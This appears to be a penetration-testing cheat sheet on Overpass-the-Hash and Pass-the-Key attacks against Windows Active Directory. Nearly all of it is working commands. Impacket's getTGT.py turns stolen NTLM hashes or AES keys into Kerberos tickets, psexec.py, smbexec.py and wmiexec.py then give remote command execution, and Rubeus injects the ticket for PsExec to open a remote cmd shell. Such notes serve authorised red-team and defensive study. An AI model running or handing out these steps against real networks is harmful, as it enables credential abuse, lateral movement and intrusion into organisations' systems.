# Overpass The Hash/Pass The Key (PTK)

## Overpass The Hash/Pass The Key (PTK)

By using [Impacket](https://github.com/SecureAuthCorp/impacket) examples:

```shell
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py rastalabs.local/jack@10.10.10.1 -k -no-pass
python smbexec.py rastalabs.local/jack@10.10.10.1 -k -no-pass
python wmiexec.py rastalabs.local/jack@10.10.10.1 -k -no-pass
```

With [Rubeus](https://github.com/GhostPack/Rubeus) and [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```shell
# Ask and inject the ticket
.\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt

# Execute a cmd in the remote machine
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

* Impacket’s `psexec.py` offers `psexec` like functionality. This will give you an interactive shell on the Windows host. `psexec.py` also allows using Service Tickets, saved as a `ccache` file for Authentication. It can be obtained via Impacket’s `GetST.py`
* It is much easier to use variables&#x20;

```
target=10.10.10.1
domain=test.local
username=john
export KRB5CCNAME=/full/path/to/john.ccache
python3 psexec.py $domain/$username@$target -k -no-pass
```
